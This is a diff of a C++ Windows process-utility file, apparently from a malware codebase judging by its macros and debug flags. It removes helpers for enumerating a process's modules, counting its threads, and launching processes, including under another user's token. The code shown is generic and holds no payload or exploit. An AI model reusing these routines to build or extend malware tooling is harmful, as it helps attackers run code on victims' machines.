@@ -5,7 +5,6 @@
 
 #include "defines.h"
 #include "mem.h"
-#include "str.h"
 #include "process.h"
 #include "winsecurity.h"
 
@@ -56,50 +55,6 @@ not_lowercase:
 	};
 #endif
 }
-HMODULE Process::_getModuleHandle(HANDLE process, LPWSTR moduleName)
-{
-	bool relative = (CWA(shlwapi, PathIsRelativeW)(moduleName) == TRUE);
-	HMODULE testModule;
-	HMODULE ret = NULL;
-	DWORD neededSize;
-
-	if(CWA(psapi, EnumProcessModules)(process, &testModule, sizeof(testModule), &neededSize))
-	{
-		HMODULE *modules = (HMODULE *)Mem::alloc(neededSize);
-		if(modules)
-		{
-			DWORD modulesCount = neededSize / sizeof(HMODULE);
-			if(CWA(psapi, EnumProcessModules)(process, modules, neededSize, &neededSize))
-			{
-				WCHAR name[MAX_PATH];
-				for(DWORD i = 0; i < modulesCount; i++)
-				{
-					if(relative)
-					{
-						if(CWA(psapi, GetModuleBaseNameW)(process, modules[i], name, (sizeof(name) / sizeof(WCHAR))) == 0)continue;
-					}
-					else
-					{
-						if(CWA(psapi, GetModuleFileNameExW)(process, modules[i], name, (sizeof(name) / sizeof(WCHAR))) == 0)continue;
-					}
-
-#         if defined(WDEBUG1)
-					WDEBUG1(WDDT_INFO, "Module: %s", name);
-#         endif
-					if(CWA(kernel32, lstrcmpiW)(name, moduleName) == 0)
-					{
-						ret = modules[i];
-						break;
-					}
-				}
-			}
-
-			Mem::free(modules);
-		}
-	}
-	return ret;
-}
-
 TOKEN_USER *Process::_getUserByProcessHandle(HANDLE process, LPDWORD sessionId)
 {
 	TOKEN_USER *tu = NULL;
@@ -134,32 +89,6 @@ TOKEN_USER *Process::_getUserByProcessId(DWORD id, LPDWORD sessionId)
 	}
 
 	return tu;  
-}
-
-DWORD Process::_getCountOfThreadsByProcessId(DWORD id)
-{
-	//FIXME: Find a faster way.
-	HANDLE snapshot = CWA(kernel32, CreateToolhelp32Snapshot)(TH32CS_SNAPTHREAD, 0);
-	if(snapshot != INVALID_HANDLE_VALUE)
-	{
-		DWORD count = 0;
-		THREADENTRY32 te;
-		te.dwSize = sizeof(THREADENTRY32);
-
-		if(CWA(kernel32, Thread32First)(snapshot, &te) != FALSE)
-		{
-			do
-			{
-				if(te.th32OwnerProcessID == id)count++;
-			}
-			while(CWA(kernel32, Thread32Next)(snapshot, &te) != FALSE);
-		}
-
-		CWA(kernel32, CloseHandle)(snapshot);
-		return count;
-	}
-
-	return (DWORD)-1;
 }
 
 bool Process::_enablePrivilege(LPWSTR privilegeName, bool enable)
@@ -247,176 +176,6 @@ bool Process::_isWow64(HANDLE process)
 	return isWow64 ? true : false;
 }
 #endif
-
-DWORD Process::_create(const LPWSTR module, const LPWSTR commandLine, const LPWSTR workDir, const STARTUPINFOW *starupInfo, PROCESS_INFORMATION *pi)
-{
-	//The Unicode version of this function, CreateProcessW, can modify the contents of this string.
-	WCHAR zeroStr[1];
-	zeroStr[0] = 0;
-
-	{
-		STARTUPINFOW defaultStartupInfo;
-		PROCESS_INFORMATION info;
-
-		if(starupInfo == NULL)
-		{
-			Mem::_zero(&defaultStartupInfo, sizeof(STARTUPINFOW));
-			defaultStartupInfo.cb = sizeof(STARTUPINFOW);
-		}
-
-#   if defined WDEBUG2
-		WDEBUG2(WDDT_INFO, "module=[%s], commandLine=[%s]", module, commandLine);
-#   endif
-
-		if(CWA(kernel32, CreateProcessW)(module,
-			commandLine == NULL ? zeroStr : commandLine,
-			NULL,
-			NULL,
-			FALSE,
-			CREATE_DEFAULT_ERROR_MODE,
-			NULL,
-			workDir,
-			starupInfo == NULL ? &defaultStartupInfo : (STARTUPINFOW *)starupInfo,
-			&info
-			) != FALSE)
-		{
-			if(pi != NULL)
-			{
-				Mem::_copy(pi, &info, sizeof(PROCESS_INFORMATION));
-			}
-			else
-			{
-				CWA(kernel32, CloseHandle)(info.hThread);
-				CWA(kernel32, CloseHandle)(info.hProcess);
-			}
-
-			return info.dwProcessId;
-		}
-#   if defined WDEBUG0 && BO_DEBUG > 0
-		else WDEBUG0(WDDT_ERROR, "Failed.");
-#   endif
-	}
-	return 0;
-}
-
-DWORD Process::_createEx(const LPWSTR module, const LPWSTR commandLine, const LPWSTR workDir, const STARTUPINFOW *starupInfo, PROCESS_INFORMATION *pi)
-{
-	DWORD pid = 0;
-	LPWSTR realCommandLine;
-
-	int r;
-	if(commandLine == NULL)r = Str::_sprintfExW(&realCommandLine, L"\"%s\"", module);
-	else r = Str::_sprintfExW(&realCommandLine, L"\"%s\" %s", module, commandLine);
-
-	if(r > 0)
-	{
-		pid = _create(NULL, realCommandLine, workDir, starupInfo, pi);
-		Mem::free(realCommandLine);
-	}
-	return pid;
-}
-
-DWORD Process::_createAsUser(HANDLE token, const LPWSTR desktop, const LPWSTR module, const LPWSTR commandLine, const LPWSTR workDir, const STARTUPINFOW *starupInfo, PROCESS_INFORMATION *pi)
-{
-	typedef BOOL (WINAPI *CREATEENVIRONMENTBLOCK)(LPVOID *environment, HANDLE token, BOOL inherit);
-	typedef BOOL (WINAPI *DESTROYENVIRONMENTBLOCK)(LPVOID environment);
-
-# if defined WDEBUG2
-	WDEBUG2(WDDT_INFO, "module=[%s], commandLine=[%s]", module, commandLine);
-# endif
-
-	bool retVal = 0;
-	HMODULE dll = CWA(kernel32, LoadLibraryA)("userenv.dll");
-	if(dll != NULL)
-	{
-		CREATEENVIRONMENTBLOCK createEnvironmentBlock   = (CREATEENVIRONMENTBLOCK)CWA(kernel32, GetProcAddress)(dll, "CreateEnvironmentBlock");
-		DESTROYENVIRONMENTBLOCK destroyEnvironmentBlock = (DESTROYENVIRONMENTBLOCK)CWA(kernel32, GetProcAddress)(dll, "DestroyEnvironmentBlock");
-		if(createEnvironmentBlock != NULL && destroyEnvironmentBlock != NULL)
-		{
-			//Create an environment variable.
-			void *environment = NULL;
-			if(createEnvironmentBlock(&environment, token, FALSE) == FALSE)environment = NULL; //Параноя.
-
-			//Create a process, complete analog to create().
-			{
-				WCHAR zeroStr[1];
-				zeroStr[0] = 0;
-
-				{
-					STARTUPINFOW defaultStartupInfo;
-					PROCESS_INFORMATION info;
-
-					if(starupInfo == NULL)
-					{
-						Mem::_zero(&defaultStartupInfo, sizeof(STARTUPINFOW));
-						defaultStartupInfo.cb        = sizeof(STARTUPINFOW);
-						defaultStartupInfo.lpDesktop = (LPWSTR)desktop;
-					}
-
-					if(CWA(advapi32, CreateProcessAsUserW)(token,
-						module,
-						commandLine == NULL ? zeroStr : commandLine,
-						NULL,
-						NULL,
-						FALSE,
-						CREATE_DEFAULT_ERROR_MODE | (environment == NULL ? 0 : CREATE_UNICODE_ENVIRONMENT),
-						environment,
-						workDir,
-						starupInfo == NULL ? &defaultStartupInfo : (STARTUPINFOW *)starupInfo,
-						&info
-						) != FALSE)
-					{
-						if(pi != NULL)
-						{
-							Mem::_copy(pi, &info, sizeof(PROCESS_INFORMATION));
-						}
-						else
-						{
-							CWA(kernel32, CloseHandle)(info.hThread);
-							CWA(kernel32, CloseHandle)(info.hProcess);
-						}
-
-						retVal = info.dwProcessId;
-					}
-				}
-			}
-
-			if(environment != NULL)destroyEnvironmentBlock(environment);
-		}
-
-		CWA(kernel32, FreeLibrary)(dll);
-	}
-
-# if defined WDEBUG0 && BO_DEBUG > 0
-	if(retVal == 0)WDEBUG0(WDDT_ERROR, "Failed.");
-# endif
-
-	return retVal;
-}
-
-DWORD Process::_createAsUserEx(HANDLE token, const LPWSTR desktop, const LPWSTR module, const LPWSTR commandLine, const LPWSTR workDir, const STARTUPINFOW *starupInfo, PROCESS_INFORMATION *pi)
-{
-	DWORD pid = 0;
-	LPWSTR realCommandLine;
-
-	int r;
-	if(commandLine == NULL)r = Str::_sprintfExW(&realCommandLine, L"\"%s\"", module);
-	else r = Str::_sprintfExW(&realCommandLine, L"\"%s\" %s", module, commandLine);
-
-	if(r > 0)
-	{
-		pid = _createAsUser(token, desktop, NULL, realCommandLine, workDir, starupInfo, pi);
-		Mem::free(realCommandLine);
-	}
-	return pid;
-}
-
-void Process::_closeProcessInformation(PROCESS_INFORMATION *pi)
-{
-	if(pi->hThread != NULL)CWA(kernel32, CloseHandle)(pi->hThread);
-	if(pi->hProcess != NULL)CWA(kernel32, CloseHandle)(pi->hProcess);
-	Mem::_zero(pi, sizeof(PROCESS_INFORMATION));
-}
 
 DWORD Process::_createThread(SIZE_T stackSize, LPTHREAD_START_ROUTINE startAddress, LPVOID parameter)
 {
